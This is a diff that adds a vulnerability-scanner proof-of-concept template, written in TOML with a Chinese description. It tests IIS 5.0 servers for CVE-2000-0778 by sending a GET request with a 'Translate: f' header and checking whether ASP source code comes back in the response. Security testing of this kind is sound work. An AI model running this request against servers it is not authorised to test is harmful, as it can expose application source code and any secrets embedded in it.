@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Microsoft IIS 5.0 'Translate: f' 源代码泄露漏洞。向 IIS 5.0 发送带有 'Translate: f' 自定义头的 HTTP GET 请求，检测是否返回 .ASP 文件的原始源代码而非执行后的 HTML 内容，从而确认漏洞是否存在。"
+id = "POC-AVE-2000-0588"
+name = "Microsoft IIS 5.0 Translate: f Source Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0778",
+    "iis",
+    "source-disclosure",
+]
+vuln_id = [
+    "CVE-2000-0778",
+    "AVE-2000-0588",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/null.asp"
+protocol = "http"
+
+[poc.requests.headers]
+Translate = "f"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@",
+    "<%",
+    "Language=",
+]
